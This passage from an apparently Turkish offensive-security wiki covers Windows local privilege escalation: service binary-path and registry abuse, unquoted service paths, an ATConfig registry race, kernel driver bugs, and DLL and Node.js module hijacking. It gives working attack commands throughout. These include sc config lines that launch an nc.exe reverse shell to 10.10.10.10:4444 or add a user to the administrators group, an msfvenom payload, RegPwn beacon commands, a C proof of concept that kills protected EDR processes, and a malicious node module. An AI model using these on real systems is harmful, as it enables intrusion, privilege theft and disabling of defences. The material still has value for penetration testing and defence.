Service Triggers, belirli koşullar gerçekleştiğinde Windows'un bir hizmeti başlatmasını sağlar (named pipe/RPC endpoint etkinliği, ETW olayları, IP kullanılabilirliği, cihazın bağlanması, GPO yenilemesi vb.). SERVICE_START hakları olmadan bile trigger'larını tetikleyerek ayrıcalıklı hizmetleri çoğu zaman başlatabilirsiniz. Enumeration ve etkinleştirme tekniklerine buradan bakın:

-
{{#ref}}
service-triggers.md
{{#endref}}

Hizmetlerin listesini alın:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### İzinler

Bir servis hakkında bilgi almak için **sc** kullanabilirsiniz
```bash
sc qc <service_name>
```
Her hizmet için gereken ayrıcalık düzeyini kontrol etmek üzere _Sysinternals_ tarafından sağlanan **accesschk** binary'sine sahip olunması önerilir.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
"Authenticated Users" grubunun herhangi bir service'i değiştirip değiştiremediğinin kontrol edilmesi önerilir:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[XP için accesschk.exe dosyasını buradan indirebilirsiniz](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Hizmeti etkinleştirme

(Örneğin SSDPSRV ile) şu hatayı alıyorsanız:

_Sistem hatası 1058 oluştu._\
_Hizmet başlatılamıyor; bunun nedeni hizmetin devre dışı bırakılmış olması veya hizmetle ilişkilendirilmiş etkin cihaz bulunmaması olabilir._

Şunu kullanarak etkinleştirebilirsiniz:
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**upnphost service'in çalışması için SSDPSRV'ye bağlı olduğunu dikkate alın (XP SP1 için)**

Bu sorunun **başka bir geçici çözümü** ise şunu çalıştırmaktır:
```
sc.exe config usosvc start= auto
```
### **Hizmet ikili dosyası yolunu değiştirme**

"Authenticated users" grubunun bir hizmet üzerinde **SERVICE_ALL_ACCESS** yetkisine sahip olduğu senaryoda, hizmetin çalıştırılabilir ikili dosyasını değiştirmek mümkündür. **sc**'yi değiştirmek ve çalıştırmak için:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Servisi yeniden başlat
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Privileges çeşitli izinler aracılığıyla yükseltilebilir:

- **SERVICE_CHANGE_CONFIG**: Service binary'sinin yeniden yapılandırılmasına izin verir.
- **WRITE_DAC**: İzinlerin yeniden yapılandırılmasını sağlar ve service configuration'larını değiştirme yeteneğine yol açar.
- **WRITE_OWNER**: Sahiplik edinmeye ve izinleri yeniden yapılandırmaya izin verir.
- **GENERIC_WRITE**: Service configuration'larını değiştirme yeteneğini devralır.
- **GENERIC_ALL**: Service configuration'larını değiştirme yeteneğini de devralır.

Bu vulnerability'nin tespiti ve exploitation'ı için _exploit/windows/local/service_permissions_ kullanılabilir.

### Services binaries weak permissions

Bir service **`LocalSystem`**, **`LocalService`**, **`NetworkService`** veya privileged bir domain account olarak çalışıyorsa, ancak **low-privileged users service EXE'sini veya üst klasörünü değiştirebiliyorsa**, service çoğu zaman **binary değiştirilip service yeniden başlatılarak** hijack edilebilir.

**Bir service tarafından çalıştırılan binary'yi değiştirip değiştiremeyeceğinizi** veya binary'nin bulunduğu **folder** üzerinde **write permissions** sahibi olup olmadığınızı kontrol edin ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Bir service tarafından çalıştırılan tüm binary'leri **wmic** kullanarak (system32 içinde olmayanları) alabilir ve **icacls** kullanarak izinlerinizi kontrol edebilirsiniz:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Ayrıca **sc** ve **icacls** de kullanabilirsiniz:
```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
Tehlikeli ACL'ler için **`Everyone`**, **`BUILTIN\Users`** veya **`Authenticated Users`** tarafından verilen izinleri, özellikle hizmet executable'ı veya onu içeren dizin üzerinde **`(F)`**, **`(M)`** ya da **`(W)`** izinlerini arayın. Pratik bir abuse akışı şöyledir:<sup>[[27]](#references)</sup>

1. `sc qc <service_name>` ile service account ve executable path'i doğrulayın.
2. `icacls <path>` ile binary'nin yazılabilir olduğunu doğrulayın.
3. Service binary'sini bir payload veya geçerli bir malicious service binary ile değiştirin.
4. `sc stop <service_name> && sc start <service_name>` ile service'i yeniden başlatın (veya reboot / service trigger bekleyin).

Kullanışlı otomatik kontroller:<sup>[[28]](#references)</sup>
```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```
> Hizmet normal bir kullanıcının hizmeti yeniden başlatmasına izin vermiyorsa, hizmetin açılışta otomatik olarak başlatılıp başlatılmadığını, başarısızlık durumunda yeniden başlatan bir eyleme sahip olup olmadığını veya hizmeti kullanan uygulama tarafından dolaylı olarak tetiklenip tetiklenemeyeceğini kontrol edin.

### Hizmet kayıt defteri değiştirme izinleri

Herhangi bir hizmet kayıt defterini değiştirip değiştiremeyeceğinizi kontrol etmelisiniz.\
Bir hizmet **kayıt defteri** üzerindeki **izinlerinizi** şu şekilde **kontrol edebilirsiniz**:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
**Authenticated Users** veya **NT AUTHORITY\INTERACTIVE** gruplarının `FullControl` izinlerine sahip olup olmadığı kontrol edilmelidir. Sahiplerse, service tarafından çalıştırılan binary değiştirilebilir.

Çalıştırılan binary'nin Path'ini değiştirmek için:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Kayıt defteri symlink race ile rastgele HKLM değer yazma (ATConfig)

Bazı Windows Accessibility özellikleri, daha sonra bir **SYSTEM** işlemi tarafından bir HKLM oturum anahtarına kopyalanan, kullanıcıya özel **ATConfig** anahtarları oluşturur. Bir kayıt defteri **symbolic link race**, bu ayrıcalıklı yazma işlemini **herhangi bir HKLM yoluna** yönlendirerek rastgele bir HKLM **değer yazma** primitive'i sağlar.<sup>[[18]](#references)</sup>

Ana konumlar (örnek: Ekran Klavyesi `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs`, yüklü Accessibility özelliklerini listeler.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>`, kullanıcı tarafından kontrol edilen yapılandırmayı depolar.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>`, logon/secure-desktop geçişleri sırasında oluşturulur ve kullanıcı tarafından yazılabilir.

Abuse akışı (CVE-2026-24291 / ATConfig):

1. SYSTEM tarafından yazılmasını istediğiniz **HKCU ATConfig** değerini doldurun.
2. Secure-desktop kopyalama işlemini tetikleyin (ör. **LockWorkstation**); bu işlem AT broker akışını başlatır.
3. `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml` üzerine bir **oplock** yerleştirerek **race'i kazanın**; oplock tetiklendiğinde **HKLM Session ATConfig** anahtarını korumalı bir HKLM hedefini gösteren bir **registry link** ile değiştirin.
4. SYSTEM, saldırgan tarafından seçilen değeri yönlendirilmiş HKLM yoluna yazar.

Rastgele HKLM değer yazma elde ettikten sonra servis yapılandırma değerlerini üzerine yazarak LPE'ye geçiş yapın:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/command line)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Normal bir kullanıcının başlatabileceği bir servis seçin (ör. **`msiserver`**) ve yazma işleminden sonra servisi tetikleyin. **Not:** public exploit implementation, race'in bir parçası olarak **workstation'ı kilitler**.

Örnek tooling (RegPwn BOF / standalone):<sup>[[19]](#references)</sup>
```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```
### Services registry AppendData/AddSubdirectory permissions

Bir registry üzerinde bu izne sahipseniz, **bu registry'nin altında alt registry'ler oluşturabileceğiniz** anlamına gelir. Windows services söz konusu olduğunda bu, **arbitrary code çalıştırmak için yeterlidir:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Bir executable'ın path'i tırnak işaretleri içinde değilse Windows, bir boşluktan önce sona eren her parçayı çalıştırmayı dener.

Örneğin, _C:\Program Files\Some Folder\Service.exe_ path'i için Windows şunları çalıştırmayı deneyecektir:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Yerleşik Windows hizmetlerine ait olanlar hariç, tırnak içine alınmamış tüm hizmet yollarını listeleyin:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Bu güvenlik açığını tespit edip exploit edebilirsiniz**: `exploit/windows/local/trusted\_service\_path` Metasploit ile bir service binary'si manuel olarak oluşturabilirsiniz:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Kurtarma İşlemleri

Windows, bir service başarısız olduğunda gerçekleştirilecek işlemleri belirtmenize olanak tanır. Bu özellik, bir binary dosyasını gösterecek şekilde yapılandırılabilir. Bu binary dosyası değiştirilebiliyorsa privilege escalation mümkün olabilir. Daha fazla ayrıntı [resmi belgelerde](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>) bulunabilir.

## Uygulamalar

### Yüklü Uygulamalar

**binary dosyaların izinlerini** kontrol edin (belki birinin üzerine yazıp privilege escalation gerçekleştirebilirsiniz) ve klasörlerin izinlerini de kontrol edin ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Yazma İzinleri

Bazı özel dosyaları okumak için bir config file'ı değiştirip değiştiremeyeceğinizi veya bir Administrator hesabı tarafından çalıştırılacak bir binary'yi (schedtasks) değiştirip değiştiremeyeceğinizi kontrol edin.

Sistemde zayıf klasör/dosya izinlerini bulmanın bir yolu şudur:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Notepad++ plugin autoload persistence/execution

Notepad++, `plugins` alt klasörleri altındaki tüm plugin DLL'lerini otomatik olarak yükler. Yazılabilir bir portable/kopya kurulum mevcutsa, kötü amaçlı bir plugin yerleştirmek her başlatmada `notepad++.exe` içinde otomatik code execution sağlar (`DllMain` ve plugin callback'leri dahil).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Başlangıçta çalıştırma

**Farklı bir kullanıcı tarafından çalıştırılacak bir registry girdisinin veya binary'nin üzerine yazıp yazamayacağınızı kontrol edin.**\
**Ayrıcalıkları yükseltmek için ilgi çekici **autoruns konumları** hakkında daha fazla bilgi edinmek üzere **aşağıdaki sayfayı okuyun**:**


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Sürücüler

Olası **third party, şüpheli/vulnerable** sürücüleri arayın
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
Bir driver rastgele kernel okuma/yazma primitive'i sunuyorsa (kötü tasarlanmış IOCTL handler'larında yaygındır), kernel memory'den doğrudan bir SYSTEM token çalarak privilege escalation gerçekleştirebilirsiniz.<sup>[[13]](#references)</sup> Adım adım tekniğe buradan ulaşabilirsiniz:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

Vulnerable call'ın attacker-controlled bir Object Manager path açtığı race-condition bug'larında, lookup işlemini kasıtlı olarak yavaşlatmak (max-length component'ler veya derin directory chain'leri kullanarak) pencereyi mikrosaniyelerden onlarca mikrosaniyeye kadar genişletebilir:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Cancel-safe queue UAF'leri, paged-pool disclosure'ları ve I/O ring pivot'ları

Bazı Windows kernel LPE chain'leri, tek başına zayıf olan iki bug'dan oluşturulabilir: queue lock hâlâ tutulurken bir request/CBD'yi free eden bir **cancel-safe queue lifetime race** ve `RtlCopyToUser` sırasında freed paged-pool allocation'ı leak eden bir **lock-release-before-copy** disclosure.<sup>[[29]](#references)</sup>

Audit ve exploitation notları:

- **Free-under-lock + sonrasında cancel**: success path'in **Acquire -> CompleteRequest/free -> Release**, cancel path'in ise **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo** yaptığı bir akış arayın. Success path, CBDQ/CSQ lock'unu bırakmadan önce `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl`'a ulaşıyorsa, `NtCancelIoFileEx -> IopCsqCancelRoutine` içinde block edilmiş bir thread daha sonra devam ederek freed bir `PFLT_CALLBACK_DATA`'yı driver'ın remove callback'ine geri geçirebilir.
- **Freed queue object'i** aynı boyutta, attacker-controlled bir paged-pool allocation ile **reclaim** edin. `NPFS` Data Queue Entries kullanışlıdır; çünkü payload ve size kontrol edilebilir ve bunları daha sonra pipe read/peek operasyonlarıyla probe edebilirsiniz. Freed object list link'leri içeriyorsa, driver'ın original list head'de sonlanmak yerine attacker-defined request structure'larını tekrar tekrar işlemesi için bunları user memory'deki **cyclic list of fake request nodes** ile overwrite edin.
- **Predictable write'ı upgrade edin**: fake request, bookkeeping write'larda (timestamps / QPC / refcount-adjacent fields) kullanılan nested context pointer'ını redirect ediyorsa, **address-controlled but not value-controlled** bir kernel write elde edebilirsiniz. Bu durumda final code/data pointer yerine sprayed pool object'in **length/size** field'ını hedefleyin, ardından corrupted object'in **out-of-bounds paged-pool read** üretmesini sağlayana kadar spray'i enumerate edin.
- **Raceable disclosure pattern**: `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` yapan herhangi bir syscall güçlü bir adaydır. Attacker copied buffer'ı büyütebiliyorsa reliability artar (örneğin serializer'ın final allocation size'ını artıran çok sayıda list/resource entry ekleyerek); çünkü daha uzun copy, makineyi crash ettirmeden replacement window'u genişletir.
- **Pointer-rich refill targets**: Windows **I/O ring** registered-buffer array'leri mükemmel disclosure target'larıdır; çünkü paged-pool size attacker-controlled'dır (`8 * regBufferCnt`) ve her element bir `_IOP_MC_BUFFER_ENTRY` için kernel pointer'dır. Bu array'lerden birini leak edin, çevresindeki `IORING_OBJECT`'i recover edin, ardından **`RegBuffers`** ve **`RegBuffersCount`**'u corrupt ederek sonraki I/O ring operasyonlarının attacker-forged entry'leri tüketmesini ve arbitrary kernel read/write sağlamasını mümkün kılın. Mevcut tek write size stable bir byte veriyorsa (örneğin `KUSER_SHARED_DATA+0x14`'ten), `0x0101010101010101` gibi tekrarlanan byte'lardan oluşan bir user pointer oluşturmak için **overlapping unaligned writes** kullanın, bunu `VirtualAlloc` ile map edin ve forged registered-buffer array'i buraya yerleştirin.<sup>[[30]](#references)</sup>

Faydalı debugging göstergeleri:
```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```
Bozuk I/O ring üzerinden rastgele kernel read/write elde ettikten sonra, standart post-primitive workflow'u kullanarak bir SYSTEM token çalın:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Registry hive memory corruption primitives

Modern hive zafiyetleri, deterministic layout'lar oluşturmanıza, yazılabilir HKLM/HKU alt öğelerini kötüye kullanmanıza ve özel bir driver olmadan metadata corruption'ı kernel paged-pool overflow'larına dönüştürmenize olanak tanır. Tüm chain'i burada öğrenin:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Attacker-controlled path'lerden kaynaklanan `RtlQueryRegistryValues` direct-mode type confusion

Bazı driver'lar userland'den bir registry path kabul eder, yalnızca bunun geçerli bir UTF-16 string olduğunu doğrular ve ardından `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` çağrısını, `int readValue` gibi bir stack scalar'ına `RTL_QUERY_REGISTRY_DIRECT` ile yapar. `RTL_QUERY_REGISTRY_TYPECHECK` eksikse `EntryContext`, geliştiricinin beklediği türe göre değil, **gerçek** registry türüne göre yorumlanır.

Bu, iki kullanışlı primitive oluşturur:<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused deputy / oracle**: Kullanıcı tarafından kontrol edilen mutlak `\Registry\...` path'i, driver'ın attacker tarafından seçilen key'leri sorgulamasına, return code/log'lar üzerinden varlık bilgisini leak etmesine ve bazı durumlarda caller'ın doğrudan erişemeyeceği değerleri okumasına olanak tanır.
- **Kernel memory corruption**: `&readValue` gibi bir scalar destination, registry value türüne bağlı olarak type-confused biçimde `REG_QWORD`, `UNICODE_STRING` veya boyutlandırılmış bir binary buffer olarak yorumlanır.

Practical exploitation notları:

- **Windows 8+ mitigation**: Sorgu, `RTL_QUERY_REGISTRY_TYPECHECK` olmadan `RTL_QUERY_REGISTRY_DIRECT` kullanan bir **untrusted hive**'a ulaşırsa kernel caller'lar `KERNEL_SECURITY_CHECK_FAILURE (0x139)` ile çöker. Exploitability'yi korumak için değerleri `HKCU` altında stage etmek yerine **trusted system hive**'lar içindeki **attacker-writable key**'leri arayın.
- **Trusted-hive staging**: `\Registry\Machine` altındaki yazılabilir alt öğeleri enumerate etmek için NtObjectManager kullanın ve sandbox'lı context'lerden erişilebilen key'leri bulmak için taramayı duplicated bir **low-integrity** token ile yeniden çalıştırın:<sup>[[26]](#references)</sup>
```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```
- **`REG_QWORD`**: 4 baytlık bir `int` içine yapılan 8 baytlık doğrudan yazma, bitişik stack verilerini bozar ve yakındaki bir callback/function pointer'ı kısmen üzerine yazabilir.
- **`REG_SZ` / `REG_EXPAND_SZ`**: direct mode, `EntryContext` değerinin bir `UNICODE_STRING` işaret etmesini bekler. Kod önce saldırgan kontrollü bir `REG_DWORD` değerini stack scalar'ına yükler ve ardından aynı buffer'ı bir string read için yeniden kullanırsa saldırgan `Length`/`MaximumLength` değerlerini kontrol eder ve `Buffer` pointer'ını kısmen etkiler; bunun sonucunda kısmen kontrol edilen bir kernel write elde edilir.
- **`REG_BINARY`**: büyük binary veriler için direct mode, `EntryContext` adresindeki ilk `LONG` değerini signed buffer size olarak ele alır. Önceki bir `REG_DWORD` read, yeniden kullanılan scalar içinde **negative** ve saldırgan kontrollü bir değer bırakırsa sonraki `REG_BINARY` query, saldırganın byte'larını doğrudan bitişik stack slot'larının üzerine kopyalar; bu genellikle callback-pointer overwrite işlemini tamamen gerçekleştirmek için en temiz yoldur.

Güçlü hunting pattern: **aynı stack variable içine, yeniden başlatmadan yapılan heterogeneous registry read işlemleri**. `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, yeniden kullanılan `EntryContext` pointer'ları ve ilk registry read'in ikinci read'in gerçekleşip gerçekleşmeyeceğini kontrol ettiği code path'leri için grep yapın.

#### Device object'lerde eksik FILE_DEVICE_SECURE_OPEN değerini kötüye kullanma (LPE + EDR kill)

Bazı imzalı third-party driver'lar, IoCreateDeviceSecure ile güçlü bir SDDL kullanarak device object oluşturur ancak DeviceCharacteristics içinde FILE_DEVICE_SECURE_OPEN değerini ayarlamayı unutur. Bu flag olmadan, device ek bir component içeren bir path üzerinden açıldığında güvenli DACL uygulanmaz ve bu da ayrıcalıksız herhangi bir kullanıcının aşağıdaki gibi bir namespace path kullanarak handle almasına olanak tanır:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (gerçek dünyadan bir örnek)

Bir kullanıcı device'ı açabildiğinde, driver tarafından sunulan privileged IOCTL'ler LPE ve tampering için kötüye kullanılabilir. Gerçek ortamlarda gözlemlenen örnek yetenekler:
- Arbitrary process'lere full-access handle döndürme (token theft / DuplicateTokenEx/CreateProcessAsUser üzerinden SYSTEM shell).
- Kısıtlanmamış raw disk read/write (offline tampering, boot-time persistence tricks).
- Protected Process/Light (PP/PPL) dahil arbitrary process'leri terminate etme; bu sayede user land üzerinden kernel aracılığıyla AV/EDR kill gerçekleştirilebilir.

Minimal PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Geliştiriciler için mitigations
- DACL tarafından kısıtlanması amaçlanan device object'leri oluştururken her zaman FILE_DEVICE_SECURE_OPEN ayarlayın.
- Privileged operation'lar için caller context'i doğrulayın. Process termination veya handle return işlemine izin vermeden önce PP/PPL kontrolleri ekleyin.
- IOCTL'leri (access mask'leri, METHOD_*, input validation) kısıtlayın ve doğrudan kernel privilege'ları yerine brokered model'leri değerlendirin.

Defender'lar için detection fikirleri
- Şüpheli device name'lerine (ör. \\ .\\amsdk*) yönelik user-mode open işlemlerini ve abuse göstergesi olan belirli IOCTL sequence'lerini izleyin.
- Microsoft'un vulnerable driver blocklist'ini (HVCI/WDAC/Smart App Control) uygulayın ve kendi allow/deny list'lerinizi yönetin.


## PATH DLL Hijacking

**PATH üzerinde bulunan bir klasörün içinde write permission'ınız** varsa bir process tarafından yüklenen DLL'i hijack ederek **privilege escalation** gerçekleştirebilirsiniz.<sup>[[2]](#references)</sup>

PATH içindeki tüm klasörlerin permission'larını kontrol edin:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Bu kontrolün nasıl abuse edileceği hakkında daha fazla bilgi için:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## `C:\node_modules` üzerinden Node.js / Electron module resolution hijacking

Bu, **Node.js** ve **Electron** uygulamalarını, beklenen module **missing** olduğunda `require("foo")` gibi bare import gerçekleştirmeleri durumunda etkileyen bir **Windows uncontrolled search path** varyantıdır.<sup>[[20]](#references)</sup>

Node, parent dizin ağacında yukarı doğru ilerleyerek her parent üzerindeki `node_modules` klasörlerini kontrol ederek package'ları resolve eder. Windows'ta bu arama drive root'a kadar ulaşabilir; dolayısıyla `C:\Users\Administrator\project\app.js` konumundan başlatılan bir uygulama şu yolları kontrol etmeye başlayabilir:<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Eğer **low-privileged user** `C:\node_modules` oluşturabiliyorsa, kötü amaçlı bir `foo.js` (veya package folder) yerleştirip **higher-privileged Node/Electron process**'inin missing dependency'yi resolve etmesini bekleyebilir. Payload, victim process'in security context'i içinde çalışır; bu nedenle hedef administrator olarak, elevated scheduled task/service wrapper üzerinden veya auto-started privileged desktop app olarak çalıştığında bu durum **LPE**'ye dönüşür.

Bu durum özellikle şu koşullarda yaygındır:

- bir dependency `optionalDependencies` içinde tanımlandığında<sup>[[22]](#references)</sup>
- bir third-party library `require("foo")` çağrısını `try/catch` ile sarıp hata durumunda devam ettiğinde
- bir package production build'lerinden kaldırıldığında, packaging sırasında dahil edilmediğinde veya kurulumu başarısız olduğunda
- vulnerable `require()` ana application code'unda değil, dependency tree'nin derinliklerinde bulunduğunda

### Vulnerable target'ları arama

Resolution path'i kanıtlamak için **Procmon** kullanın:<sup>[[23]](#references)</sup>

- `Process Name` filtresini hedef executable'a (`node.exe`, Electron app EXE'si veya wrapper process) göre ayarlayın
- `Path` filtresini `contains` `node_modules` olacak şekilde ayarlayın
- `NAME NOT FOUND` kayıtlarına ve `C:\node_modules` altındaki son başarılı open işlemine odaklanın

Unpacked `.asar` dosyalarında veya application source'larında kullanılabilecek faydalı code-review pattern'leri:
```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```
### Exploitation

1. Procmon veya kaynak incelemesinden **eksik package adını** belirleyin.
2. Henüz mevcut değilse root lookup dizinini oluşturun:
```powershell
mkdir C:\node_modules
```
3. Beklenen tam adla bir modül bırakın:
```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```
4. Mağdur uygulamayı tetikleyin. Uygulama `require("foo")` çağırır ve meşru modül mevcut değilse Node, `C:\node_modules\foo.js` dosyasını yükleyebilir.

Bu desene uyan eksik isteğe bağlı modüllere gerçek dünyadan örnek olarak `bluebird` ve `utf-8-validate` verilebilir; ancak yeniden kullanılabilir olan kısım **tekniktir**: ayrıcalıklı bir Windows Node/Electron işleminin çözümleyeceği herhangi bir **eksik bare import** bulun.

### Tespit ve hardening fikirleri

- Bir kullanıcının `C:\node_modules` oluşturması veya buraya yeni `.js` dosyaları/paketleri yazması durumunda uyarı üretin.
- Yüksek bütünlük düzeyine sahip işlemlerin `C:\node_modules\*` üzerinden okuma yapmasını araştırın.
- Production ortamında tüm runtime bağımlılıklarını paketleyin ve `optionalDependencies` kullanımını denetleyin.
- Üçüncü taraf kodlarında sessiz `try { require("...") } catch {}` kalıplarını inceleyin.
- Kütüphane destekliyorsa isteğe bağlı probe'ları devre dışı bırakın (örneğin bazı `ws` deployment'ları, `WS_NO_UTF_8_VALIDATE=1` ile legacy `utf-8-validate` probe'unu önleyebilir).

## Ağ

### Paylaşımlar
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
